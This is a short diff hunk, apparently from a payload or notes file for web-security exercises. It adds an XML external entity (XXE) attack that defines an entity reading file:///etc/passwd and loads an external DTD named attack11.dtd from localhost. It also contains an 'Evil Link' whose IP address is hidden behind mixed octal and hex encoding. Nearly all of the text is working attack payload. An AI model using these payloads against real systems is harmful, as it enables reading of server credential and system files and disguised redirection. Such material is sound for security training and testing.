@@ -7,7 +7,15 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!ENTITY secret SYSTEM 'file:///etc/passwd'>
 
+--------
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+	<!ENTITY % xxe SYSTEM "http://localhost:9090/attack11.dtd">
+	%xxe;
+]>
+<comment>  <text>no need to inject here &secret;</text></comment>
 
+----
 
 <h1><a href="http://0300.168.000000000261.0x4a:8080/">Mixed encoding - Evil Link </a></h1>
 
